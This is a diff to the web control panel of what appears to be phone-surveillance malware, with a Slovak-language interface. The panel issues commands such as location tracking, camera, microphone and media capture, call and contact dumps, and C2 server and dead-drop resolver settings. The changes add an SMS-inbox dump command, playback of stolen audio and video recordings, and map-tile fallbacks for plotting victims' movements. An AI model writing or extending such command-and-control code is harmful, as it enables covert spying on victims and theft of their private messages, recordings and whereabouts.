@@ -162,8 +162,12 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
 .tag.violet{background:rgba(124,92,255,.15);color:#c4b5fd;border-color:rgba(124,92,255,.32)}
 .empty{padding:42px 20px;text-align:center;color:var(--dim);font-size:13.5px}
 .empty svg{width:38px;height:38px;opacity:.35;margin-bottom:10px}
-#map{height:430px;border-radius:0 0 var(--r) var(--r);background:#0a1020}
+#map{height:min(430px,46vh);border-radius:0 0 var(--r) var(--r);background:#0a1020}
 #mapMini{height:220px;border-radius:var(--r);overflow:hidden}
+.leaflet-container{overflow:hidden}
+.tiles-dark .leaflet-tile-pane{filter:invert(1) hue-rotate(180deg) brightness(.86) contrast(.95) saturate(.55)}
+.leaflet-control-attribution{background:rgba(8,12,22,.75)!important;color:var(--dim)!important;font-size:10px}
+.leaflet-control-attribution a{color:var(--mut)!important}
 .leaflet-container{background:#0a1020;font-family:inherit}
 .leaflet-popup-content-wrapper{background:#131c2f;color:var(--txt);border:1px solid var(--line2)}
 .leaflet-popup-tip{background:#131c2f}
@@ -254,7 +258,17 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
   .hamb{display:inline-flex}
   .search{display:none}
   .wrap{padding:16px 13px 34px}
-  .top{padding:11px 13px}
+  /* The header wraps: buttons on the first row, the device name on its own
+     row - otherwise the name overlaps the buttons on a phone. */
+  .top{flex-wrap:wrap;row-gap:9px;padding:10px 12px}
+  .who{order:5;flex:1 0 100%;gap:10px}
+  .who b{font-size:13.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .who small{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .spacer{flex:1}
+  .pill{font-size:11px;padding:5px 9px}
+  .top .btn{padding:7px 10px}
+  #map{height:min(330px,42vh)}
+  #mapMini{height:180px}
 }
 </style></head>
 <body>
@@ -668,12 +682,34 @@ async function loadLocation(){
     : '<tr><td colspan="4" class="empty">Zatiaľ žiadne polohy. Pošli príkaz <b>loc</b>.</td></tr>';
   drawMap(track);
 }
+/* Tile providers without an API key. CARTO's "basemaps" endpoint asks for a
+   key now, so the map uses OpenStreetMap (dark filter via CSS) and falls back
+   to the next provider when a tile fails. */
+const TILE_PROVIDERS=[
+  {u:'https://tile.openstreetmap.org/{z}/{x}/{y}.png', a:'© OpenStreetMap contributors', max:19, dark:true},
+  {u:'https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png', a:'© OpenStreetMap contributors, HOT', max:19, dark:true},
+  {u:'https://basemaps.cartocdn.com/rastertiles/dark_all/{z}/{x}/{y}.png', a:'© OpenStreetMap © CARTO', max:20, dark:false}
+];
 function baseMap(el){
-  const m = L.map(el,{zoomControl:true}).setView([48.1486,17.1077],6);
-  // The tiles need no API key; if the CDN is blocked the map still works -
-  // the background is plain, the markers and the track stay on top.
-  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',
-    {attribution:'© OpenStreetMap © CARTO', maxZoom:19, crossOrigin:true}).addTo(m);
+  const m = L.map(el,{zoomControl:true, attributionControl:true}).setView([48.1486,17.1077],6);
+  m._tileIdx = 0; m._tileErr = 0; m._layer = null;
+  const addProvider = i => {
+    if(m._layer){ m.removeLayer(m._layer); m._layer=null; }
+    if(i >= TILE_PROVIDERS.length){ return; }
+    const p = TILE_PROVIDERS[i];
+    m._tileIdx = i; m._tileErr = 0;
+    el.classList.toggle('tiles-dark', !!p.dark);
+    m._layer = L.tileLayer(p.u, {attribution:p.a, maxZoom:p.max, crossOrigin:true})
+      .on('tileerror', ()=>{
+        m._tileErr++;
+        if(m._tileErr >= 4 && m._tileIdx + 1 < TILE_PROVIDERS.length){
+          addProvider(m._tileIdx + 1);      // this provider is blocked -> next
+        }
+      })
+      .addTo(m);
+  };
+  addProvider(0);
+  m._nextProvider = () => addProvider((m._tileIdx+1) % TILE_PROVIDERS.length);
   return m;
 }
 function drawMap(track){
@@ -787,22 +823,40 @@ async function loadFiles(){
   if(!S.device) return;
   const files = await j('/api/files?device_id='+encodeURIComponent(S.device))||[];
   $('fileHint').textContent = files.length+' súborov';
-  $('fileRows').innerHTML = files.length ? files.map(f=>`<tr>
+  $('fileRows').innerHTML = files.length ? files.map(f=>{
+    const isAud=/\.(mp3|m4a|ogg|wav|aac|amr|opus)$/i.test(f.filename||'');
+    const play = isAud ? `<audio controls preload="none" style="height:30px;max-width:220px;vertical-align:middle"
+        src="/api/file/${f.id}/preview"></audio> ` : '';
+    return `<tr>
       <td class="mono">${fmtT(f.ts)}</td><td>${kindTag(f.kind)}</td>
       <td>${esc(f.filename)}</td><td class="mono">${(f.size/1024).toFixed(1)} KB</td>
-      <td><a class="btn" style="padding:5px 10px" href="/api/file/${f.id}" download>stiahnuť</a></td></tr>`).join('')
+      <td>${play}<a class="btn" style="padding:5px 10px" href="/api/file/${f.id}" download>stiahnuť</a></td></tr>`;
+  }).join('')
     : '<tr><td colspan="5" class="empty">Zatiaľ žiadne súbory.</td></tr>';
   const media = files.filter(f=>/photo|image|video|audio|screen|cam|mic|media/i.test(f.kind||'')||/\.(jpe?g|png|webp|gif|mp4|mp3|m4a|webm)$/i.test(f.filename||''));
   $('mediaHint').textContent = media.length+' položiek';
   $('gallery').innerHTML = media.length ? media.map(f=>{
-    const isImg=/\.(jpe?g|png|webp|gif)$/i.test(f.filename||'');
-    const isVid=/\.(mp4|webm|mov)$/i.test(f.filename||'');
-    const isAud=/\.(mp3|m4a|ogg|wav|aac)$/i.test(f.filename||'');
-    const inner = isImg? `<img loading="lazy" src="/api/file/${f.id}/preview">`
-      : `<div class="ph">${icon(isVid?'screen':isAud?'mic':'media')}</div>`;
-    return `<div class="gitem" onclick="window.open('/api/file/${f.id}/preview','_blank')">
-      ${inner}<div class="nm"><b>${esc(f.filename)}</b>${esc(f.kind||'')} · ${(f.size/1024).toFixed(0)} KB</div></div>`;
-  }).join('') : '<div class="empty" style="grid-column:1/-1">Zatiaľ žiadne médiá. Pošli príkaz <b>media</b> alebo <b>cam</b>.</div>';
+    const name=f.filename||'';
+    const isImg=/\.(jpe?g|png|webp|gif)$/i.test(name);
+    const isVid=/\.(mp4|webm|mov|3gp)$/i.test(name);
+    const isAud=/\.(mp3|m4a|ogg|wav|aac|amr|opus)$/i.test(name);
+    let inner;
+    if(isImg){
+      inner = `<img loading="lazy" src="/api/file/${f.id}/preview" onclick="window.open('/api/file/${f.id}/preview','_blank')">`;
+    } else if(isAud){
+      inner = `<div class="ph">${icon('mic')}</div>
+        <audio controls preload="none" style="width:100%;margin-top:8px"
+               src="/api/file/${f.id}/preview"></audio>`;
+    } else if(isVid){
+      inner = `<video controls preload="none" style="width:100%;margin-top:8px"
+               src="/api/file/${f.id}/preview"></video>`;
+    } else {
+      inner = `<div class="ph">${icon('media')}</div>`;
+    }
+    return `<div class="gitem">
+      ${inner}<div class="nm"><b>${esc(name)}</b>${esc(f.kind||'')} · ${(f.size/1024).toFixed(0)} KB
+        <a href="/api/file/${f.id}" download style="color:var(--acc)"> stiahnuť</a></div></div>`;
+  }).join('') : '<div class="empty" style="grid-column:1/-1">Zatiaľ žiadne médiá. Pošli príkaz <b>media</b>, <b>cam</b> alebo <b>mic</b>.</div>';
 }
 
 /* ---------- commands ---------- */
@@ -826,6 +880,8 @@ const CMDS = [
   {k:'apps',    t:'Aplikácie',   d:'zoznam nainštalovaných', g:'Údaje'},
   {k:'calls',   t:'Hovory',      d:'história hovorov', g:'Údaje'},
   {k:'contacts',t:'Kontakty',    d:'zoznam kontaktov', g:'Údaje'},
+  {k:'smsdump', t:'SMS inbox',   d:'stiahnuť posledné správy zo schránky', g:'Údaje',
+   args:[{n:'n', l:'Počet správ', type:'seg', opts:[['20',20],['50',50],['100',100]]}]},
   {k:'diag',    t:'Diagnostika', d:'stav aplikácie a zariadenia', g:'Údaje'},
   {k:'ddr',     t:'Nový C2',     d:'preveriť dead-drop resolvery', g:'Systém'},
   {k:'cfg',     t:'C2 URL',      d:'nastaviť vlastný server', g:'Systém',
